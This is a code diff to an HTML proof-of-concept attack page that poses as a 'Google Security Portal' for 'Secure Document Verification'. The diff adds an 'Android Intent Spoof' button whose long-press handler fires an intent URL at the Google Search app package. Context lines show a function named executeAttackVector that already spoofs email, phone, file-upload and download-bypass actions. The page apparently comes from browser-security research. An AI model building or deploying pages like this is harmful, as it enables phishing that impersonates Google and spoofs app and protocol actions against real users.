@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker & Protocol Spoof PoC</title>
+    <title>File Picker, Protocol & Intent Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -81,12 +81,13 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Container dengan 4 Tombol Terpisah dengan Intent Berbeda (Termasuk Bypass Download) -->
+    <!-- Container dengan tombol lengkap termasuk Android Intent Spoof -->
     <div class="button-container">
         <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
         <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
         <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
         <a href="https://google.com" class="spoof-link" id="targetLinkDownload" data-intent="download_bypass">Open Window & Bypass Download</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
     <!-- Uploaded Image Preview Box -->
@@ -166,6 +167,14 @@
                         imagePreview.src = "";
                         previewBox.style.display = "block";
                     }
+                    else if (actionType === 'intentspoof') {
+                        // Implementasi Android Intent Scheme bypass berdasarkan riset NDevTK (com.google.android.googlequicksearchbox)
+                        const intentUrl = "intent://www.google.com/gasearch?q=https://google.com#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                        window.location.href = intentUrl;
+                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
 
                 } catch (err) {
                     console.debug("Handler cancelled or blocked:", err.message);
@@ -202,6 +211,13 @@
             executeAttackVector('downloadbypass', linkDownload.getAttribute('data-intent'));
         });
         linkDownload.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol Android Intent Spoof
+        const linkIntent = document.getElementById("targetLinkIntent");
+        linkIntent.addEventListener("contextmenu", (e) => {
+            executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent'));
+        });
+        linkIntent.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
